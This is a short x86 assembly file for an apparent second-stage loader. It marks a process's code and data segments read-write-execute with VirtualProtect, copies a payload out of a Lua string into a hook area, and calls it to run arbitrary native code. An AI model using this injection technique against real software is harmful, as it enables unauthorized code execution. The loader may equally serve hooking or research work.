%include 'globals.inc'

bits 32
section text
org 0                           ; has no definite origin!
                                ; ebx = lua_state (from stage0)

stage1:        
        mov al, [hookRsrcFlag]
        test al, al
        jnz .copyPayload
        
        
        ; cache cursor ?    
        push eax                ; dummy
        
                                ; get write permissions for .text, .data, and .rsrc
                                
        push esp                ; ptr store old permissions (dummy)
        push 40h                ; new access: R/W/X
        push 64B000h            ; length
        push 401000h            ; start of segment 
        call [virtualProtect]
        test eax, eax
        pop eax                 ; remove dummy
        jz .abort
        
        call [lua_open]
        mov [rtState], eax
        
        mov byte [hookRsrcFlag], 1

.copyPayload:    
        
        push 3
        push ebx
        call [lua_tostring]
        pop ecx
        pop edi
        
        mov ecx, [eax+4]        ; num bytes
        mov edi, hookBase
        lea esi, [eax+8]
        rep movsb
        
        call [eax]                ; run payload
        
.abort:    
        retn